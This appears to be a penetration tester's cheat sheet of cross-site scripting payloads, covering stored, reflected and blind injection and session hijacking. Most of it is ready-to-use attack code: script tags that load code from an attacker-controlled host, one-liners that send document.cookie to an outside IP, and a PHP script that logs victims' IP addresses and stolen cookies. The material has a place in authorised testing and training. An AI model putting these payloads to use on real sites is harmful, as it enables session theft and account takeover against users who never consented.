# XSS

### 1) Stored

Text to save to the application. If it is vulnerable once saved, when we access the website again we should see the code being executed.

    <script>alert("XSS")</script>
    
    <script>alert(document.cookie)</script>
    
    <script>alert(window.origin)</script>

### 2) Reflected

Include this payload in a URL. Most common place are the search pages for example.

    http://[SERVER_IP]:[PORT]/index.php?task=%3Cscript%3Ealert(document.cookie)%3C/script%3E

### 3) Blind

A good way to test this is to see if we can retrieve files externally using the JavaScript code.

    <script src=http://[OUR_IP]></script>
    
    '><script src=http://[OUR_IP]></script>
    
    <script>$.getScript("http://[OUR_IP]")</script>
    
    "><script src=http://[OUR_IP]></script>
    javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
    <script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>

### 4) Privilege Escalation using Session Hijacking

We need to make sure that the cookie is stored in the browser, we also need to consider that cookies can have two flags:

    Secure: only sends the cookie over an encrypted connection like HTTPS.
    HttpOnly: denies Javascript access to cookie; so we need that this options de disabled, you can check this in the Developer Tools of the browser.

After verifying that the cookie could be stolen by its flags and having a valid XSS field we can use one of the following payloads:

#### Option 1:

    document.location='http://OUR_IP/index.php?c='+document.cookie;
or

    new Image().src='http://OUR_IP/index.php?c='+document.cookie;

Access the Host

    <script src=http://OUR_IP>/script.js</script>

#### Option 2:

Payload

    <img src=x onerror=fetch('http://10.10.14.37/'+document.cookie);>

PHP Server code

    <?php
    if (isset($_GET['c'])) {
        $list = explode(";", $_GET['c']);
        foreach ($list as $key => $value) {
            $cookie = urldecode($value);
            $file = fopen("cookies.txt", "a+");
            fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
            fclose($file);
        }
    }
    ?>
